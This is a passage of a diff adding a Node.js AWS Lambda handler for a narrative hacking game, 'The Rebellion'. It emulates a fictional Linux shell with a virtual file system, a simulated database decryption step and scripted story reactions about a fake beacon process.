@@ -1,0 +1,1936 @@
+// ════════════════════════════════════════════════════════════════════════
+//   THE REBELLION — AWS LAMBDA HANDLER  (hackingEP)
+//   Drop this entire file into your Lambda function (Node.js 18+).
+//
+//   Client contract:
+//     REQUEST  body: { server: "core01"|"node083", raw: "ls -la /etc",
+//                       state: { cwd, prevCwd, sshWait, decrypted,
+//                                sqliteMode, sqliteFile } }
+//     RESPONSE body: { ok, output, action?, target?, state }
+//        action: "clear" | "ssh" | "decrypt" | undefined
+//        target: when action="ssh", the redirect URL the client navigates to
+//
+//   To edit story-critical text: search for the file path or block name in
+//   STORE.<server>.FILES and edit in place. Redeploy ONLY this Lambda —
+//   no client redeploy needed.
+// ════════════════════════════════════════════════════════════════════════
+'use strict';
+
+import { createHash } from 'node:crypto';
+
+const CORS = {
+  'Access-Control-Allow-Origin':  '*',
+  'Access-Control-Allow-Methods': 'POST, OPTIONS',
+  'Access-Control-Allow-Headers': 'Content-Type',
+  'Content-Type':                 'application/json',
+};
+const respond = (status, body) => ({ statusCode: status, headers: CORS, body: JSON.stringify(body) });
+
+// EDIT STORY NAMES/DATES HERE, THEN REDEPLOY THIS LAMBDA.
+// The HTML pages should not need a redeploy for story copy changes.
+const STORY_CONFIG = {
+  COMPANY_NAME:        'CD-0S',
+  COMPANY_FULL_NAME:   'CD-0S Corporation',
+  HACKER_COLLECTIVE:   'LivSeg',
+  HACKER_OPERATOR:     'GoodGirl17',
+  HACKER_PARTNER:      'n0b0dy',
+  EXECUTIVE_NAME:      'Halloran',
+  EXECUTIVE_INITIAL:   'H.',
+  LEAK_TABLE_NAME:     'offshore_transfers',
+  REVEAL_TIMESTAMP:    '2077-07-07 17:07:00',
+  REVEAL_DATE_DISPLAY: '17:07 - 07.07.2077',
+  RESISTANCE_COMMAND:  'join resistance',
+  RESISTANCE_PREFIX:   'join resistance --> at this date',
+  DATA_SAFE_LINE:      'we got all your data, it\'s "safe" with us',
+};
+
+export const handler = async (event) => {
+  const method = event.requestContext?.http?.method || event.httpMethod || 'POST';
+  if (method === 'OPTIONS') return { statusCode: 204, headers: CORS };
+
+  let body = {};
+  try { body = typeof event.body === 'string' ? JSON.parse(event.body || '{}') : (event.body || {}); }
+  catch { return respond(400, { ok: false, message: 'bad json' }); }
+
+  const { server, raw, state } = body;
+  const store = STORE[server];
+  if (!store) return respond(404, { ok: false, message: `unknown server: ${server}` });
+
+  try {
+    const result = runShell({ store, raw: raw || '', state: normalizeState(state) });
+    return respond(200, Object.assign({ ok: true }, applyStoryConfig(result)));
+  } catch (err) {
+    return respond(500, { ok: false, message: `shell error: ${err.message}` });
+  }
+};
+
+// ════════════════════════════════════════════════════════════════════════
+function applyStoryConfig(value) {
+  if (typeof value === 'string') return storyText(value);
+  if (Array.isArray(value)) return value.map(applyStoryConfig);
+  if (value && typeof value === 'object') {
+    const out = {};
+    for (const [k, v] of Object.entries(value)) out[k] = applyStoryConfig(v);
+    return out;
+  }
+  return value;
+}
+
+function storyText(text) {
+  const map = [
+    ['CD-0S Corporation', STORY_CONFIG.COMPANY_FULL_NAME],
+    ['CD-0S', STORY_CONFIG.COMPANY_NAME],
+    ['LivSeg', STORY_CONFIG.HACKER_COLLECTIVE],
+    ['GoodGirl17', STORY_CONFIG.HACKER_OPERATOR],
+    ['n0b0dy', STORY_CONFIG.HACKER_PARTNER],
+    ['Halloran', STORY_CONFIG.EXECUTIVE_NAME],
+    ['"H." (internal alias)', '"' + STORY_CONFIG.EXECUTIVE_INITIAL + '" (internal alias)'],
+    ['offshore_transfers', STORY_CONFIG.LEAK_TABLE_NAME],
+    ['2026-07-07 17:07:00', STORY_CONFIG.REVEAL_TIMESTAMP],
+    ['17:07  ?  07.07.26', STORY_CONFIG.REVEAL_DATE_DISPLAY],
+    ['17:07  ??  07.07.26', STORY_CONFIG.REVEAL_DATE_DISPLAY],
+    ['17:07 07.07.26', STORY_CONFIG.REVEAL_DATE_DISPLAY],
+    ['07.07.26', '07.07.2077'],
+  ];
+  let out = String(text);
+  for (const [from, to] of map) out = out.split(from).join(to);
+  return out;
+}
+
+function resistanceReveal() {
+  return STORY_CONFIG.DATA_SAFE_LINE + '\n' + STORY_CONFIG.RESISTANCE_PREFIX + ' ' + STORY_CONFIG.REVEAL_DATE_DISPLAY;
+}
+function normalizeState(s) {
+  s = s || {};
+  return {
+    cwd:        typeof s.cwd        === 'string'  ? s.cwd        : '/home/observer',
+    prevCwd:    typeof s.prevCwd    === 'string'  ? s.prevCwd    : '/home/observer',
+    sshWait:    typeof s.sshWait    === 'boolean' ? s.sshWait    : false,
+    sshTarget:  typeof s.sshTarget  === 'string'  ? s.sshTarget  : null,
+    decrypted:  typeof s.decrypted  === 'boolean' ? s.decrypted  : false,
+    sqliteMode: typeof s.sqliteMode === 'boolean' ? s.sqliteMode : false,
+    sqliteFile: typeof s.sqliteFile === 'string'  ? s.sqliteFile : null,
+    // ── reactive-world state (the box reacts to what the analyst does) ──
+    beaconKilled: typeof s.beaconKilled === 'boolean' ? s.beaconKilled : false,
+    beaconPid:    typeof s.beaconPid    === 'number'  ? s.beaconPid    : 4291,
+    ledgerSeen:   typeof s.ledgerSeen   === 'boolean' ? s.ledgerSeen   : false,
+  };
+}
+
+// If the operator killed the beacon, the watchdog respawned it under a new
+// PID. Every process/socket view should reflect the live (respawned) pid so
+// the box stays internally consistent after the kill.
+function beaconize(text, state) {
+  if (!state || !state.beaconKilled) return text;
+  const pid = state.beaconPid || 5117;
+  return String(text).split('4291').join(String(pid)).split('48314').join('49077');
+}
+
+// ── Path utils ──────────────────────────────────────────────────────────
+function normPath(p) {
+  const parts = String(p || '').split('/').filter(Boolean);
+  const r = [];
+  for (const pt of parts) {
+    if (pt === '.') continue;
+    if (pt === '..') { r.pop(); continue; }
+    r.push(pt);
+  }
+  return '/' + r.join('/');
+}
+function resolvePath(state, input, server) {
+  const HOME = server === 'core01' ? '/home/observer' : '/root';
+  if (!input || input === '~') return HOME;
+  if (input.startsWith('~/'))  return normPath(HOME + '/' + input.slice(2));
+  if (input.startsWith('/'))   return normPath(input);
+  return normPath(state.cwd + '/' + input);
+}
+function getEntry(fs, path) {
+  const p = path === '/' ? '/' : path.replace(/\/+$/, '');
+  if (fs[p]) return fs[p];
+  if (p === '/') return fs[p] || null;
+  const idx = p.lastIndexOf('/');
+  const parent = idx <= 0 ? '/' : p.slice(0, idx);
+  const name = p.slice(idx + 1);
+  const parentEntry = fs[parent];
+  if (parentEntry && parentEntry.type === 'dir' && (parentEntry.ch || []).includes(name)) return { type: 'file' };
+  return null;
+}
+function fileContent(store, path) {
+  if (store.FILES[path] !== undefined) return store.FILES[path];
+  if (store.SERVER === 'node083') {
+    const m = path.match(/^\/root\/databases\/db_(\d{3})\.enc$/);
+    if (m) return dbEncPreview(Number(m[1]));
+  }
+  return undefined;
+}
+function dbEncPreview(n) {
+  const id = String(n).padStart(3, '0');
+  if (n === 17) return (
+`SQLite format 3^@^@^@ encrypted container: db_${id}.enc
+page_size=4096
+schema_hint=entries,offshore_transfers
+integrity=OK
+key_hint=/tmp/.hidden/key.pem
+
+binary payload follows:
+7f 45 4e 43 2d 51 32 00 91 4c 2a 88 13 f0 09 ac
+c8 7b 11 0e 62 6f 4f 53 0d 17 aa 41 e3 1c 77 09
+
+cat: db_${id}.enc: file is encrypted (aes-256-cbc). decrypt it with the recovered key:
+  openssl enc -d -aes-256-cbc -in /root/databases/db_${id}.enc -out /tmp/db_${id}.sql -kfile /tmp/.hidden/key.pem
+  (shorthand: decrypt /tmp/.hidden/key.pem /root/databases/db_${id}.enc)`
+  );
+  return (
+`ENC-Q2 database fragment: db_${id}.enc
+status=CORRUPTED
+first_bad_page=${2 + (n % 9)}
+journal=recovery failed
+
+00 00 ff 00 13 37 ${id} 90 00 00 ee 44 11 7a 6d 21
+I/O error: short read on /dev/sdb1
+cat: db_${id}.enc: Input/output error`
+  );
+}
+
+// ── Tiny shell parser ───────────────────────────────────────────────────
+function tokenize(s) {
+  const out = []; let i = 0, cur = '', quote = null;
+  while (i < s.length) {
+    const c = s[i];
+    if (quote) { if (c === quote) { quote = null; i++; continue; } cur += c; i++; continue; }
+    if (c === '"' || c === "'") { quote = c; i++; continue; }
+    if (c === ' ' || c === '\t') { if (cur) { out.push(cur); cur = ''; } i++; continue; }
+    cur += c; i++;
+  }
+  if (cur) out.push(cur);
+  return out;
+}
+function splitPipes(raw) {
+  const out = []; let cur = '', quote = null;
+  for (let i = 0; i < raw.length; i++) {
+    const c = raw[i];
+    if (quote) { cur += c; if (c === quote) quote = null; continue; }
+    if (c === '"' || c === "'") { quote = c; cur += c; continue; }
+    if (c === '|') { out.push(cur.trim()); cur = ''; continue; }
+    cur += c;
+  }
+  if (cur.trim()) out.push(cur.trim());
+  return out;
+}
+function splitCommands(raw) {
+  const out = []; let cur = '', quote = null;
+  for (let i = 0; i < raw.length; i++) {
+    const c = raw[i], n = raw[i + 1];
+    if (quote) { cur += c; if (c === quote) quote = null; continue; }
+    if (c === '"' || c === "'") { quote = c; cur += c; continue; }
+    if (c === ';') { if (cur.trim()) out.push(cur.trim()); cur = ''; continue; }
+    if (c === '&' && n === '&') { if (cur.trim()) out.push(cur.trim()); cur = ''; i++; continue; }
+    cur += c;
+  }
+  if (cur.trim()) out.push(cur.trim());
+  return out;
+}
+function hasGlob(s) {
+  return /[*?[]/.test(String(s || ''));
+}
+function globToRegExp(glob) {
+  let out = '^';
+  for (const ch of glob) {
+    if (ch === '*') out += '.*';
+    else if (ch === '?') out += '.';
+    else out += ch.replace(/[|\\{}()[\]^$+?.]/g, '\\$&');
+  }
+  return new RegExp(out + '$');
+}
+function listDirNames(store, dir, showHidden = true) {
+  const ent = getEntry(store.FS, dir);
+  if (!ent || ent.type !== 'dir') return null;
+  let names = [...(ent.ch || [])];
+  if (showHidden) names = ['.', '..', ...names];
+  return names;
+}
+function expandPathArgs(store, state, args) {
+  const out = [];
+  for (const arg of args) {
+    if (!hasGlob(arg)) { out.push(arg); continue; }
+    const slash = arg.lastIndexOf('/');
+    const dirPart = slash >= 0 ? arg.slice(0, slash + 1) : '';
+    const baseGlob = slash >= 0 ? arg.slice(slash + 1) : arg;
+    const dirPath = resolvePath(state, dirPart || '.', store.SERVER);
+    const names = listDirNames(store, dirPath, false) || [];
+    const re = globToRegExp(baseGlob);
+    const matches = names.filter(n => re.test(n)).sort().map(n => dirPart + n);
+    if (matches.length) out.push(...matches);
+    else out.push(arg);
+  }
+  return out;
+}
+function readArgText(store, state, arg) {
+  const t = resolvePath(state, arg, store.SERVER);
+  if (t === '/tmp/db_017.sql') {
+    if (!state.decrypted) return { error: `No such file or directory` };
+    return { text: store.DB017_SQL || '' };
+  }
+  const content = fileContent(store, t);
+  if (content !== undefined) return { text: content };
+  const e = getEntry(store.FS, t);
+  if (!e) return { error: 'No such file or directory' };
+  if (e.type === 'dir') return { error: 'Is a directory' };
+  return { error: 'Permission denied' };
+}
+function commandPath(store, cmd) {
+  const dirs = ['/bin', '/usr/bin', '/usr/local/bin', '/sbin', '/usr/sbin'];
+  for (const dir of dirs) {
+    const ent = getEntry(store.FS, dir);
+    if (ent && (ent.ch || []).includes(cmd)) return `${dir}/${cmd}`;
+  }
+  const implemented = ['cd','pwd','echo','history','help','exit','logout','type','which','ps','netstat','df','ss','lsof','systemctl','sqlite3','decrypt','tree','grep','head','tail','find','wc','sort','uniq','base64','stat','date','whoami','hostname','uname','id','uptime','env','ifconfig','iptables','last','lastb','iostat','nmap','ping'];
+  if (implemented.includes(cmd) || (store.CMDS || {})[cmd] !== undefined) return `/usr/bin/${cmd}`;
+  return '';
+}
+function walkFiles(store, start, includeDirs = false) {
+  const root = resolvePath({ cwd: '/', prevCwd: '/' }, start, store.SERVER);
+  const out = [];
+  function rec(path) {
+    const ent = getEntry(store.FS, path);
+    if (ent && ent.type === 'dir') {
+      if (includeDirs) out.push(path);
+      for (const name of (ent.ch || [])) rec(path === '/' ? '/' + name : path + '/' + name);
+      return;
+    }
+    if (ent || fileContent(store, path) !== undefined) out.push(path);
+  }
+  rec(root);
+  return out;
+}
+function sshHostFromArgs(args) {
+  const skipValue = new Set(['-F', '-i', '-p', '-l', '-o', '-J', '-W', '-b']);
+  let host = '';
+  for (let i = 0; i < args.length; i++) {
+    const arg = args[i];
+    if (!arg) continue;
+    if (skipValue.has(arg)) { i++; continue; }
+    if (arg.startsWith('-')) continue;
+    host = arg;
+  }
+  if (!host) return '';
+  if (host.includes('@')) host = host.split('@').pop();
+  return host.replace(/^\[|\]$/g, '').replace(/:\d+$/, '');
+}
+function sshRouteFor(store, args) {
+  const host = sshHostFromArgs(args);
+  const tail = args.join(' ');
+  if (!store.SSH_ROUTES) return null;
+  for (const [routeHost, route] of Object.entries(store.SSH_ROUTES)) {
+    const aliases = [routeHost, ...(route.aliases || [])];
+    if (aliases.some(alias => host === alias || tail.includes(alias))) return { host: routeHost, route };
+  }
+  return null;
+}
+
+// ════════════════════════════════════════════════════════════════════════
+function runShell({ store, raw, state }) {
+  // SSH y/N wait flow
+  if (state.sshWait) {
+    const ans = raw.trim().toLowerCase();
+    if (ans === 'y' || ans === 'yes') {
+      const target = state.sshTarget || 'server2.html';
+      state.sshWait = false; state.sshTarget = null;
+      return { output: 'Connecting...', action: 'ssh', target, state };
+    }
+    state.sshWait = false; state.sshTarget = null;
+    return { output: 'Aborted.', state };
+  }
+
+  if (state.sqliteMode) return runSqlite({ store, raw, state });
+
+  const commands = splitCommands(raw);
+  if (commands.length > 1) {
+    const outputs = [];
+    const reactions = [];
+    for (const command of commands) {
+      const result = runShell({ store, raw: command, state });
+      state = result.state || state;
+      if (result.output) outputs.push(result.output);
+      if (Array.isArray(result.reactions)) reactions.push(...result.reactions);
+      if (result.action) return Object.assign({ output: outputs.join('\n'), state, reactions }, result);
+    }
+    return { output: outputs.join('\n'), state, reactions };
+  }
+
+  const stages = splitPipes(raw);
+  if (stages.length === 0) return { output: '', state };
+
+  let stdin = null, lastOut = '';
+  const reactions = [];
+  for (let s = 0; s < stages.length; s++) {
+    const stage = stages[s];
+    const result = runOne({ store, raw: stage, state, stdin });
+    if (Array.isArray(result.reactions)) reactions.push(...result.reactions);
+    if (s === stages.length - 1 && result.action) {
+      return Object.assign({ state, reactions }, result);
+    }
+    stdin = result.output;
+    lastOut = result.output;
+  }
+  return { output: lastOut, state, reactions };
+}
+
+function runOne({ store, raw, state, stdin }) {
+  const trimmed = raw.trim();
+  if (!trimmed) return { output: '' };
+  const tokens = tokenize(trimmed);
+  const cmd = tokens[0];
+  const rest = tokens.slice(1);
+
+  if (trimmed.toLowerCase() === STORY_CONFIG.RESISTANCE_COMMAND)
+    return { output: resistanceReveal() };
+
+  if (cmd === 'clear' || cmd === 'reset') return { action: 'clear', output: '' };
+
+  // SSH
+  if (cmd === 'ssh') {
+    const match = sshRouteFor(store, rest);
+    if (match) {
+      state.sshWait = true;
+      state.sshTarget = match.route.target;
+      return { output: match.route.banner };
+    }
+    return { output: `ssh: connect to host ${sshHostFromArgs(rest) || rest[0] || '?'}: Connection refused` };
+  }
+
+  if (cmd === 'cd') {
+    if (rest.length > 1) return { output: 'bash: cd: too many arguments' };
+    const target = rest[0] === '-' ? state.prevCwd : resolvePath(state, rest[0], store.SERVER);
+    const entry  = getEntry(store.FS, target);
+    if (!entry)                return { output: `bash: cd: ${rest[0] || '~'}: No such file or directory` };
+    if (entry.type === 'file') return { output: `bash: cd: ${rest[0]}: Not a directory` };
+    const old = state.cwd; state.cwd = target; state.prevCwd = old;
+    return { output: rest[0] === '-' ? state.cwd : '' };
+  }
+  if (cmd === 'pwd') return { output: state.cwd };
+
+  if (cmd === 'ls') {
+    // Forensic tell: the beacon's exe was unlinked while still running, so
+    // `ls -l /proc/<pid>/exe` shows the symlink pointing at "(deleted)".
+    const procExe = rest.find(a => /^\/proc\/\d+\/exe$/.test(a));
+    if (procExe && store.SERVER === 'node083') {
+      const pid = procExe.match(/\/proc\/(\d+)\/exe/)[1];
+      if (pid === String(state.beaconPid) || pid === '4291') {
+        return /-[a-z]*l/.test(rest.join(''))
+          ? { output: `lrwxrwxrwx 1 root root 0 May 17 03:30 ${procExe} -> '/usr/bin/python3.10 (deleted)'` }
+          : { output: procExe };
+      }
+      return { output: `ls: cannot access '${procExe}': No such file or directory` };
+    }
+    const flags = rest.filter(a => a.startsWith('-')).join('');
+    const paths = expandPathArgs(store, state, rest.filter(a => !a.startsWith('-')));
+    const targets = paths.length ? paths : ['.'];
+    const blocks = [];
+    let hasDirBlock = false;
+    for (const p of targets) {
+      const target = resolvePath(state, p, store.SERVER);
+      const res = lsOutput(store, target, flags);
+      if (res === null) blocks.push(`ls: cannot access '${p}': No such file or directory`);
+      else {
+        const entry = getEntry(store.FS, target);
+        const label = targets.length > 1 && entry && entry.type === 'dir';
+        if (label) hasDirBlock = true;
+        blocks.push(label ? `${p}:\n${res}` : res);
+      }
+    }
+    return { output: blocks.join(hasDirBlock ? '\n\n' : (/-[a-z]*l/.test(flags) ? '\n' : '  ')) };
+  }
+
+  if (cmd === 'tree') {
+    const showHidden = rest.includes('-a');
+    let levelLimit = Infinity;
+    const lIdx = rest.indexOf('-L');
+    if (lIdx >= 0 && rest[lIdx + 1] && /^\d+$/.test(rest[lIdx + 1])) levelLimit = parseInt(rest[lIdx + 1], 10);
+    const startArg = rest.find(a => !a.startsWith('-') && !/^\d+$/.test(a));
+    const start = startArg ? resolvePath(state, startArg, store.SERVER) : state.cwd;
+    const e = getEntry(store.FS, start);
+    if (!e) return { output: `tree: ${startArg || start} [error opening dir]` };
+    const lines = []; let dirs = 0, files = 0;
+    lines.push(start);
+    function walk(path, depth, prefix) {
+      if (depth > levelLimit) return;
+      const ent = getEntry(store.FS, path);
+      if (!ent || ent.type !== 'dir') return;
+      let ch = [...(ent.ch || [])]; if (!showHidden) ch = ch.filter(x => !x.startsWith('.'));
+      ch.sort();
+      ch.forEach((name, i) => {
+        const last = i === ch.length - 1;
+        const childAbs = path === '/' ? '/' + name : path + '/' + name;
+        const child = getEntry(store.FS, childAbs);
+        const branch = last ? '`-- ' : '|-- ';
+        const isDir = child && child.type === 'dir';
+        if (isDir) dirs++; else files++;
+        lines.push(prefix + branch + name + (isDir ? '/' : ''));
+        if (isDir) walk(childAbs, depth + 1, prefix + (last ? '    ' : '|   '));
+      });
+    }
+    walk(start, 1, '');
+    lines.push('', `${dirs} directories, ${files} files`);
+    return { output: lines.join('\n') };
+  }
+
+  if (cmd === 'cat') {
+    if (stdin !== null && rest.length === 0) return { output: stdin };
+    if (rest.length === 0) return { output: 'cat: missing file operand' };
+    const out = [];
+    for (const arg of expandPathArgs(store, state, rest)) {
+      const t = resolvePath(state, arg, store.SERVER);
+      if (t === '/tmp/db_017.sql') {
+        if (!state.decrypted) { out.push(`cat: ${arg}: No such file or directory`); continue; }
+        out.push(store.DB017_SQL || '(empty)'); continue;
+      }
+      const content = fileContent(store, t);
+      if (content !== undefined) { out.push(content); continue; }
+      const e = getEntry(store.FS, t);
+      if (!e)                    out.push(`cat: ${arg}: No such file or directory`);
+      else if (e.type === 'dir')  out.push(`cat: ${arg}: Is a directory`);
+      else                        out.push(`cat: ${arg}: Permission denied`);
+    }
+    // Reading the breach log is the moment the other analysts realise
+    // someone is live on the box with them.
+    const readsBreach = expandPathArgs(store, state, rest)
+      .some(a => resolvePath(state, a, store.SERVER) === '/var/log/breach.log');
+    if (store.SERVER === 'node083' && readsBreach && !state.ledgerSeen) {
+      state.ledgerSeen = true;
+      return { output: out.join('\n'), state, reactions: [
+        { delay: 7000, c: 'red', t: `<r.takeda> the breach log is being read right now, this second. who is logged into 083.` },
+      ] };
+    }
+    return { output: out.join('\n') };
+  }
+
+  if (cmd === 'head' || cmd === 'tail') {
+    let n = 10;
+    const nIdx = rest.indexOf('-n');
+    if (nIdx >= 0 && /^\d+$/.test(rest[nIdx + 1] || '')) n = parseInt(rest[nIdx + 1], 10);
+    const compactN = rest.find(a => /^-\d+$/.test(a));
+    if (compactN) n = Math.abs(parseInt(compactN, 10));
+    let text = stdin;
+    if (text == null) {
+      const f = rest.find((a, i) => !a.startsWith('-') && !(rest[i - 1] === '-n') && !/^\d+$/.test(a));
+      if (f) {
+        const t = resolvePath(state, f, store.SERVER);
+        const content = fileContent(store, t);
+        if (content !== undefined) text = content;
+        else return { output: `${cmd}: cannot open '${f}' for reading: No such file or directory` };
+      } else return { output: '' };
+    }
+    const lines = String(text).split('\n');
+    return { output: (cmd === 'head' ? lines.slice(0, n) : lines.slice(-n)).join('\n') };
+  }
+
+  if (cmd === 'grep') {
+    const flags = rest.filter(a => a.startsWith('-'));
+    const positional = rest.filter(a => !a.startsWith('-'));
+    const pat = positional[0]; if (!pat) return { output: 'usage: grep PATTERN [file]' };
+    const fileArg = positional[1];
+    let text = stdin;
+    if (text == null && fileArg) {
+      const files = expandPathArgs(store, state, [fileArg]);
+      const chunks = [];
+      for (const f of files) {
+        const r = readArgText(store, state, f);
+        if (r.error) return { output: `grep: ${f}: ${r.error}` };
+        chunks.push(String(r.text));
+      }
+      text = chunks.join('\n');
+    }
+    if (text == null) return { output: '' };
+    const ci = flags.some(f => f.includes('i'));
+    const inv = flags.some(f => f.includes('v'));
+    const ext = flags.some(f => f.includes('E'));
+    const re = new RegExp(ext ? pat : pat.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), ci ? 'i' : '');
+    const out = String(text).split('\n').filter(l => inv ? !re.test(l) : re.test(l));
+    return { output: out.join('\n') };
+  }
+
+  if (cmd === 'wc') {
+    const files = expandPathArgs(store, state, rest.filter(a => !a.startsWith('-')));
+    const flagL = rest.includes('-l'), flagW = rest.includes('-w'), flagC = rest.includes('-c');
+    const format = (text, name = '') => {
+      const lines = text ? text.split('\n').length : 0;
+      const words = text.split(/\s+/).filter(Boolean).length;
+      const bytes = text.length;
+      const parts = [];
+      if (!flagL && !flagW && !flagC) parts.push(lines, words, bytes);
+      else { if (flagL) parts.push(lines); if (flagW) parts.push(words); if (flagC) parts.push(bytes); }
+      return parts.map(n => String(n).padStart(7, ' ')).join('') + (name ? ' ' + name : '');
+    };
+    if (stdin != null && files.length === 0) return { output: format(String(stdin)).trimStart() };
+    if (files.length === 0) return { output: 'wc: missing file operand' };
+    const out = [];
+    for (const f of files) {
+      const r = readArgText(store, state, f);
+      out.push(r.error ? `wc: ${f}: ${r.error}` : format(String(r.text), f));
+    }
+    return { output: out.join('\n') };
+  }
+  if (cmd === 'sort' || cmd === 'uniq') {
+    const files = expandPathArgs(store, state, rest.filter(a => !a.startsWith('-')));
+    let text = String(stdin ?? '');
+    if (stdin == null && files.length) {
+      const chunks = [];
+      for (const f of files) {
+        const r = readArgText(store, state, f);
+        if (r.error) return { output: `${cmd}: cannot read: ${f}: ${r.error}` };
+        chunks.push(String(r.text));
+      }
+      text = chunks.join('\n');
+    }
+    const lines = text.split('\n');
+    if (cmd === 'sort') return { output: lines.sort().join('\n') };
+    return { output: lines.filter((l, i, a) => i === 0 || l !== a[i - 1]).join('\n') };
+  }
+  if (cmd === 'echo') return { output: rest.join(' ') };
+  if (cmd === 'type') return { output: rest.length ? rest.map(c => commandPath(store, c) ? `${c} is ${commandPath(store, c)}` : `bash: type: ${c}: not found`).join('\n') : 'type: usage: type [-afptP] name [name ...]' };
+  if (cmd === 'which') return { output: rest.map(c => commandPath(store, c)).filter(Boolean).join('\n') };
+
+  if (cmd === 'stat') {
+    if (!rest[0]) return { output: 'stat: missing operand' };
+    const t = resolvePath(state, rest[0], store.SERVER);
+    const e = getEntry(store.FS, t);
+    const content = fileContent(store, t);
+    if (!e && content === undefined) return { output: `stat: cannot stat '${rest[0]}': No such file or directory` };
+    const meta = (store.FILE_META || {})[t] || {
+      size: (content || '').length || 4096,
+      mode: e && e.type === 'dir' ? '0755/drwxr-xr-x' : '0644/-rw-r--r--',
+      uid: '0/root', gid: '0/root',
+      atime: '2025-05-17 04:22:18.000000000 +0000',
+      mtime: '2025-05-17 03:00:00.000000000 +0000',
+      ctime: '2025-05-17 03:00:00.000000000 +0000',
+      birth: '2025-05-17 03:00:00.000000000 +0000',
+      inode: 200000 + Math.floor(Math.random() * 700000),
+    };
+    return { output:
+`  File: ${t}
+  Size: ${meta.size}\tBlocks: ${Math.ceil(meta.size/512)}\tIO Block: 4096   ${e && e.type === 'dir' ? 'directory' : 'regular file'}
+Device: 801h/2049d\tInode: ${meta.inode}\tLinks: 1
+Access: (${meta.mode})  Uid: (${meta.uid})  Gid: (${meta.gid})
+Access: ${meta.atime}
+Modify: ${meta.mtime}
+Change: ${meta.ctime}
+ Birth: ${meta.birth}`};
+  }
+
+  if (cmd === 'base64') {
+    const decode = rest.includes('-d') || rest.includes('--decode');
+    let input = stdin != null ? String(stdin) : '';
+    if (!input) {
+      const f = rest.find(a => !a.startsWith('-'));
+      if (f) {
+        const r = readArgText(store, state, f);
+        if (r.error) return { output: `base64: ${f}: ${r.error}` };
+        input = String(r.text);
+      }
+    }
+    if (!input) return { output: '' };
+    try {
+      if (decode) return { output: Buffer.from(input.replace(/\s+/g, ''), 'base64').toString('utf8') };
+      return { output: Buffer.from(input, 'utf8').toString('base64') };
+    } catch { return { output: 'base64: invalid input' }; }
+  }
+
+  if (cmd === 'kill' || cmd === 'pkill' || cmd === 'killall') {
+    const pid = rest.find(a => /^\d+$/.test(a));
+    const beaconRef = store.SERVER === 'node083' &&
+      (pid === String(state.beaconPid) || pid === '4291' ||
+       /python3|beacon|4291/.test(rest.join(' ')));
+    if (beaconRef) {
+      // The process really dies — but the cron watchdog brings it straight
+      // back under a fresh PID. Killing the symptom, not the cause.
+      const oldPid = state.beaconPid || 4291;
+      const newPid = 5117 + Math.floor(Math.random() * 90);
+      const firstTime = !state.beaconKilled;
+      state.beaconKilled = true;
+      state.beaconPid = newPid;
+      const reactions = firstTime ? [
+        { delay: 8000,  c: 'o',   t: `[systemd] livseg-keepalive.timer: watchdog detected beacon down — invoking respawn` },
+        { delay: 11500, c: 'r2',  t: `[netwatch] outbound RESTORED — 172.16.47.83:49077 -> 91.213.8.44:4444 — beacon back as PID ${newPid}` },
+        { delay: 15000, c: 'red', t: `<r.takeda> it came right back. that's a cron watchdog, not the process. pull the cron job, not the PID.` },
+      ] : [
+        { delay: 9000,  c: 'r2',  t: `[netwatch] beacon respawned again — PID ${newPid}. /etc/cron.d is bringing it back every time.` },
+      ];
+      return { output: `[1]+  Killed    /usr/bin/python3 (pid ${oldPid})`, reactions, state };
+    }
+    // Non-beacon kill by numeric PID. pkill/killall by name fall through to
+    // the per-server deny table below.
+    if (cmd === 'kill') {
+      if (!pid) return { output: 'kill: usage: kill [-s sigspec | -n signum | -sigspec] pid | jobspec ...' };
+      if (pid === '1244') return { output: `kill: (${pid}): Operation not permitted` };
+      return { output: `kill: (${pid}): No such process` };
+    }
+  }
+
+  // Forensic: a running-but-unlinked binary still shows via /proc/<pid>/exe.
+  // This is how you prove the beacon's executable was deleted from disk.
+  if (cmd === 'readlink') {
+    const tgt = rest.find(a => !a.startsWith('-')) || '';
+    const m = tgt.match(/^\/proc\/(\d+)\/exe$/);
+    if (m && store.SERVER === 'node083' && (m[1] === String(state.beaconPid) || m[1] === '4291')) {
+      return { output: `/usr/bin/python3.10 (deleted)` };
+    }
+    if (m) return { output: `readlink: ${tgt}: No such file or directory` };
+    return { output: rest.length ? '' : 'readlink: missing operand' };
+  }
+
+  if ((cmd === 'openssl' || cmd === 'decrypt') && raw.includes('db_017')) {
+    // Accept both the real openssl incantation and the `decrypt` shorthand.
+    // The real form needs the key material; reward players who supply it.
+    const usesKey = /key\.pem|-kfile|-k\b|-pass|-in\b/.test(raw);
+    if (cmd === 'openssl' && !usesKey) {
+      return { output: `openssl: enc: AES-256-CBC requires a key — pass -kfile /tmp/.hidden/key.pem` };
+    }
+    const firstTime = !state.decrypted;
+    state.decrypted = true;
+    const reactions = firstTime ? [
+      { delay: 6500, c: 'red', t: `<GoodGirl17> 017 just got decrypted. good. we left it for them to read.` },
+    ] : [];
+    return { action: 'decrypt', output: 'Output written: /tmp/db_017.sql', reactions, state };
+  }
+  if (cmd === 'decrypt') return { output: 'Usage: decrypt <keyfile> <encrypted_file>\n  e.g. decrypt /tmp/.hidden/key.pem /root/databases/db_017.enc' };
+  if (cmd === 'openssl') return { output: 'usage: openssl enc -d -aes-256-cbc -in <file> -out <outfile> -kfile <keyfile>' };
+
+  if (cmd === 'sqlite3') {
+    const f = rest[0];
+    if (f && f.includes('db_017')) {
+      if (!state.decrypted) return { output: `sqlite3: ${f}: unable to open database file — decrypt first` };
+      state.sqliteMode = true; state.sqliteFile = f;
+      return { output: `SQLite version 3.39.2 2022-07-21 15:24:47\nEnter ".help" for usage hints.` };
+    }
+    if (!f) return { output: 'Usage: sqlite3 <database_file>' };
+    return { output: `sqlite3: ${f}: unable to open database file` };
+  }
+
+  if (cmd === 'find') {
+    const key = `find ${rest.join(' ')}`;
+    if (store.CMDS[key] !== undefined) return { output: store.CMDS[key] };
+    const start = rest[0] && !rest[0].startsWith('-') ? rest[0] : '.';
+    const startPath = resolvePath(state, start, store.SERVER);
+    const nameIdx = rest.indexOf('-name');
+    const typeIdx = rest.indexOf('-type');
+    const namePat = nameIdx >= 0 ? rest[nameIdx + 1] : null;
+    const typeVal = typeIdx >= 0 ? rest[typeIdx + 1] : null;
+    const all = walkFiles(store, startPath, typeVal === 'd');
+    const re = namePat ? globToRegExp(namePat) : null;
+    const out = all.filter(p => {
+      const ent = getEntry(store.FS, p);
+      if (typeVal === 'f' && ent && ent.type === 'dir') return false;
+      if (typeVal === 'd' && (!ent || ent.type !== 'dir')) return false;
+      if (re && !re.test(p.split('/').pop())) return false;
+      return true;
+    });
